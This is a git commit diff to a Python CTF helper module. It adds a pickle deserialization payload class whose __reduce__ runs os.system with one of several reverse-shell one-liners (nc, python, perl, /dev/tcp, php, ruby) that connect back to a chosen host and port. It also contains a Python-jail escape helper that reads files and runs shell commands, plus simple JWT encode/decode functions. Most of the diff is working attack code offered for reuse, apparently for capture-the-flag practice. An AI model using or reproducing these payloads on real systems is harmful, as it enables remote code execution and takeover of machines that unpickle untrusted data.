c4bc2f758442b3db8c35a179b287602c912212a6
Larry Xue <larry.p.xue@gmail.com>
2020-06-19 15:12:24 -0400

    improved pickle rev shell and added non json jwt

--- utils/ctftools.py
+++ utils/ctftools.py
@@ -1,18 +1,42 @@
 #!/usr/bin/env python3
+import base64
+import hashlib
+import hmac
+import json
+import math
 import os
 import pickle
 import string
 import time
+
 import requests
 
 class PickleRevShell:
-	def __init__(self, host, port):
+	def __init__(self, host, port, typ="python"):
 		self.host = host
 		self.port = port
+		#taken from https://github.com/lukechilds/reverse-shell
+		#and http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+		cmds = {
+			"nc":
+				f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {self.host} {self.port} > /tmp/f",
+			"python":
+				f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.host}",{self.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
+			"perl":
+				f"""perl -e 'use Socket;$i="{self.host}";$p={self.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
+			"sh":
+				f"/bin/sh -i >& /dev/tcp/{self.host}/{self.port} 0>&1",
+			"nc2":
+				f"nc -e /bin/sh {self.host} {self.port}",
+			"php":
+				f"""php -r '$sock=fsockopen("{self.host}",{self.port});exec("/bin/sh -i <&3 >&3 2>&3");'""",
+			"ruby":
+				f"""ruby -rsocket -e'f=TCPSocket.open("{self.host}",{self.port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
+		}
+		self.cmd = cmds[typ]
 	
 	def __reduce__(self):
-		cmd = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {self.host} {self.port} > /tmp/f"
-		return os.system, (cmd, )
+		return os.system, (self.cmd, )
 
 def pickle_rev_shell(host, port):
 	return pickle.dumps(PickleRevShell(host, port))
@@ -52,24 +76,48 @@ class PyJail:
 		"""directly run with s appended to self.builtins"""
 		return self.fn(self.builtins + s)
 	
-	def call(self, fn: str, *args, module=None):
+	def call(self, fn: str, *args, module: str = None):
 		"""call function"""
 		return self.run(self._call(fn, *args, module))
 	
-	def cat(self, filename):
+	def cat(self, filename: str):
 		return self.run(self._call("open", filename) + ".read()")
 	
-	def ls(self, folder="."):
+	def ls(self, folder: str = "."):
 		return self.call("listdir", folder, module="os")
 	
-	def shell(self, cmd):
+	def shell(self, cmd: str):
 		return self.run(self._call("popen", cmd, module="os") + ".read()")
 	
-	def _import(self, module):
+	def _import(self, module: str):
 		return f"['__import__']({module!r})"
 	
-	def _call(self, fn: str, *args, module=None):
+	def _call(self, fn: str, *args, module: str = None):
 		if module is None:  # call builtin
 			return f"[{fn!r}](*{args!r})"
 		else:  # import module and then call function
 			return self._import(module) + f".{fn}(*{args!r})"
+
+# for weird challs like NahamCon CTF 2020 B'omarr Style
+def non_json_jwt_encode(s: bytes, key, extra_headers=None):
+	header_dict = {"alg": "HS256", "typ": "JWT"}
+	if extra_headers is not None:
+		header_dict.update(extra_headers)
+	header = jwt_b64encode(json.dumps(header_dict).encode("utf-8"))
+	payload = jwt_b64encode(s)
+	
+	signature = jwt_b64encode(
+		hmac.new(key, header + b"." + payload, digestmod=hashlib.sha256).digest()
+	)
+	return b".".join((header, payload, signature))
+
+def non_json_jwt_decode(token: bytes):
+	header, token, _ = map(jwt_b64decode, token.split(b"."))
+	return json.loads(header), token
+
+def jwt_b64decode(s: bytes):
+	padded_len = math.ceil(len(s) / 4) * 4
+	return base64.urlsafe_b64decode(s.ljust(padded_len, b"="))
+
+def jwt_b64encode(s: bytes):
+	return base64.urlsafe_b64encode(s).rstrip(b"=")
